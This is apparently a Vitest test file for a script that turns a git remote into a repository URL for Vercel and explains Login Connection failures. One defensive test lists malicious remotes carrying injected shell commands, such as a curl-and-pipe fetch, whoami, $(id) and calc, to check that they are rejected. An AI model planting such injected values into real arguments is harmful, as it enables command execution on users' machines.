import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { devNull, tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { isLoginConnectionFailure, main, originUrl, repositoryUrl } from './connect-git.mjs';

/**
 * `npm run connect-git` hands Vercel one thing: the repository URL. Everything
 * that can go wrong before the CLI is called is about reading that URL out of
 * whatever form the remote happens to take — and a remote written by `gh`,
 * by the wizard's token path, or by hand are three different strings naming
 * one repository.
 */

describe('repositoryUrl', () => {
  it('keeps a plain https remote', () => {
    expect(repositoryUrl('https://github.com/someone/app.git')).toBe('https://github.com/someone/app');
  });

  it('drops the username the token path leaves in the remote', () => {
    expect(repositoryUrl('https://someone@github.com/someone/app.git')).toBe('https://github.com/someone/app');
  });

  it('rewrites an ssh remote — it names the same repository', () => {
    expect(repositoryUrl('git@github.com:someone/app.git')).toBe('https://github.com/someone/app');
    expect(repositoryUrl('git@github.com:some-org/nested.name')).toBe('https://github.com/some-org/nested.name');
  });

  it('works for a host that is not github.com', () => {
    expect(repositoryUrl('https://gitlab.com/someone/app.git')).toBe('https://gitlab.com/someone/app');
  });

  it('answers null rather than handing Vercel something it cannot use', () => {
    expect(repositoryUrl('/srv/git/app.git')).toBeNull();
    expect(repositoryUrl('')).toBeNull();
  });

  // The remote is the clone author's text, and on Windows it goes on to be an
  // argument of a command line. Both halves are checked, not just the host.
  it('answers null for a remote carrying shell syntax', () => {
    const shellish = [
      'https://github.com/o/r&&curl%20evil/x|cmd',
      'https://github.com/o/r;whoami',
      'https://github.com/o/$(id)',
      'https://github.com/o/r `id`',
      'https://git&hub.com/o/r',
      'git@git|hub.com:o/r',
      'git@github.com:o/r^&calc',
    ];
    for (const remote of shellish) expect(repositoryUrl(remote)).toBeNull();
  });
});

describe('originUrl', () => {
  let dir: string;
  const savedGlobal = process.env.GIT_CONFIG_GLOBAL;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'connect-git-'));
    // So a machine-wide `url.insteadOf` rewrite cannot change the answer.
    process.env.GIT_CONFIG_GLOBAL = devNull;
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
    if (savedGlobal === undefined) delete process.env.GIT_CONFIG_GLOBAL;
    else process.env.GIT_CONFIG_GLOBAL = savedGlobal;
  });

  it('is null in a directory that is not a repository', () => {
    writeFileSync(join(dir, 'package.json'), '{}');
    expect(originUrl(dir)).toBeNull();
  });

  it('is null in a repository with no remote', () => {
    execFileSync('git', ['init'], { cwd: dir, stdio: 'ignore' });
    expect(originUrl(dir)).toBeNull();
  });

  it('reads the remote back', () => {
    execFileSync('git', ['init'], { cwd: dir, stdio: 'ignore' });
    execFileSync('git', ['remote', 'add', 'origin', 'https://github.com/someone/app.git'], { cwd: dir });
    expect(originUrl(dir)).toBe('https://github.com/someone/app.git');
  });
});

/**
 * The one failure this script cannot fix and must not be vague about: a Vercel
 * account that has never been given a GitHub Login Connection. Vercel refuses
 * the link, the repository is already pushed by then, and "would not connect
 * the repository" reads as a problem with the repository.
 *
 * Matched on two words rather than the sentence, because there is no one
 * sentence: the server says `Failed to link <repo>. You need to add a Login
 * Connection to your GitHub account first.` with the name interpolated and
 * coloured, and the CLI has a branch of its own keyed on `Add a Login
 * Connection`.
 */
describe('isLoginConnectionFailure', () => {
  it('knows the sentence Vercel actually answers with', () => {
    expect(
      isLoginConnectionFailure(
        'Error: Failed to link someone/app. You need to add a Login Connection to your GitHub account first. (400)',
      ),
    ).toBe(true);
  });

  it('knows the CLI’s other branch, coloured or not', () => {
    const plain = [
      'Error: Failed to connect the GitHub repository someone/app.',
      'Add a Login Connection to your GitHub account first.',
    ].join('\n');
    expect(isLoginConnectionFailure(plain)).toBe(true);
    const coloured = `Error: Failed to link \u001b[1msomeone/app\u001b[22m. You need to add a Login Connection first.`;
    expect(isLoginConnectionFailure(coloured)).toBe(true);
    expect(isLoginConnectionFailure('you need to add a login connection to your github account first.')).toBe(true);
  });

  it('does not claim every refusal is this one', () => {
    expect(isLoginConnectionFailure('Error: repo_not_found')).toBe(false);
    expect(isLoginConnectionFailure('Error: Install the GitHub App on this repository first.')).toBe(false);
    expect(isLoginConnectionFailure('Error: Failed to connect the GitHub repository someone/app.')).toBe(false);
  });
});

/**
 * What the exit code says, because the wizard reads it and a person may not be
 * watching: 2 is the missing connection, 1 is any other refusal, 0 is
 * connected. `fail()` is never called on any of them — the repository is
 * pushed and the app is deployed by the time this runs, and connecting is the
 * optional half.
 */
describe('main', () => {
  let dir: string;
  const savedGlobal = process.env.GIT_CONFIG_GLOBAL;
  const savedExitCode = process.exitCode;

  const captureLog = () => {
    const lines: string[] = [];
    const spy = vi.spyOn(console, 'log').mockImplementation((...args: unknown[]) => {
      lines.push(args.join(' '));
    });
    return { lines, restore: () => spy.mockRestore() };
  };

  /** A CLI that is never resolved and never spawned — just an answer. */
  const answering = (result: { status: number; stdout?: string; stderr?: string }) => () => ({
    status: result.status,
    stdout: result.stdout ?? '',
    stderr: result.stderr ?? '',
  });

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'connect-git-main-'));
    process.env.GIT_CONFIG_GLOBAL = devNull;
    execFileSync('git', ['init'], { cwd: dir, stdio: 'ignore' });
    execFileSync('git', ['remote', 'add', 'origin', 'https://github.com/someone/app.git'], { cwd: dir });
    mkdirSync(join(dir, '.vercel'));
    writeFileSync(join(dir, '.vercel', 'project.json'), '{"projectName":"app"}');
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
    if (savedGlobal === undefined) delete process.env.GIT_CONFIG_GLOBAL;
    else process.env.GIT_CONFIG_GLOBAL = savedGlobal;
    process.exitCode = savedExitCode;
  });

  it('names the missing connection, keeps the two places to fix it, and exits 2', async () => {
    const { lines, restore } = captureLog();
    try {
      await main(
        dir,
        answering({
          status: 1,
          stderr: 'Error: Failed to link someone/app. You need to add a Login Connection to your GitHub account first.',
        }),
      );
    } finally {
      restore();
    }
    expect(process.exitCode).toBe(2);
    const said = lines.join('\n');
    expect(said).toContain('Vercel has no GitHub connection');
    expect(said).toContain('vercel.com → Settings → Authentication → GitHub');
    expect(said).toContain('vercel.com → this project → Settings → Git');
  });

  it('keeps the old wording, and exit 1, for every other refusal', async () => {
    const { lines, restore } = captureLog();
    try {
      await main(dir, answering({ status: 1, stderr: 'Error: repo_not_found' }));
    } finally {
      restore();
    }
    expect(process.exitCode).toBe(1);
    const said = lines.join('\n');
    expect(said).toContain('Vercel would not connect the repository.');
    expect(said).toContain('Error: repo_not_found');
    expect(said).not.toContain('Vercel has no GitHub connection');
  });

  it('leaves the exit code alone when it connected', async () => {
    const { lines, restore } = captureLog();
    try {
      await main(dir, answering({ status: 0, stdout: 'Connected GitHub repository someone/app' }));
    } finally {
      restore();
    }
    expect(process.exitCode).toBe(savedExitCode);
    expect(lines.join('\n')).toContain('pushing to the default branch');
  });
});
